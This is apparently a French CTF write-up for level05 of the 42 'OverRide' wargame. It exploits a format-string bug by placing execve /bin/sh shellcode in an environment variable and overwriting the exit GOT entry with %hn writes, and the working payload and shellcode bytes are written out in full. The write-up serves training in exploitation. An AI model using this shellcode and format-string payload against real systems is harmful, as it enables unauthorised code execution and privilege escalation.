# Override
Override 42 security level05

```
level05@OverRide:~$ ls
level05
level05@OverRide:~$ ./level05
test
test
level05@OverRide:~$ ./level05
TeTs
tets
level05@OverRide:~$
```

On a un programme plutot simple qui réécrit notre chaine en lower et qui exit à la fin et ne return pas.
Après avoir lower notre chaine, le buffer est renvoyé à printf qui l'affiche.
Comme dans Rainfall nous allons vouloir ajouter notre Shellcode en variable memoire.

Pour info, on ne peut pas utiliser une attaque comme precedemment car:
```
level05@OverRide:~$ gdb ./level05
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b * main
Breakpoint 1 at 0x8048444
(gdb) p system
No symbol table is loaded.  Use the "file" command.
```
Pas de call à system :).

Trouvons nos différents elements pour construire notre attaque:
```
info function exit
Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt

(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
```
Nous utiliserons le premier.

On export notre shellcode:
```
export SHELLCODE=$(python -c "print '\x90' * 500 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
gdb ./level05
b * main
Breakpoint 1 at 0x8048444
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048444 in main ()
0xffffd689:	 "/home/users/level05/level05"
0xffffd6a5:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffd76d:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffd835:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v\315\200"
```

Maintenant trouvons l'offset à laquelle notre string est stockée.
```
python -c "print 'aaaa' + ' %x ' * 16" | ./level05
aaaa 64  f7fcfac0  0  0  0  0  ffffffff  ffffd514  f7fdb000  61616161  20782520  20782520  20782520  20782520  20782520  20782520
61616161 -> 10
```

Au vu de l'adresse de la variable d'environement qui est très grande en décimale, nous choisissons de l'écrire en 2 fois.
Donc:
```
0xffffd76d = 4294956909
# On la split en 2: ffff = 65535 | d777 = 55149
1ere partie = d777 - 8 ( les 2 adresses ecrites avant) = 55148
Seconde partie = ffff - 55149 = 10386
python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55148d"+"%10$hn"+"%10386d"+"%11$hn"'
```
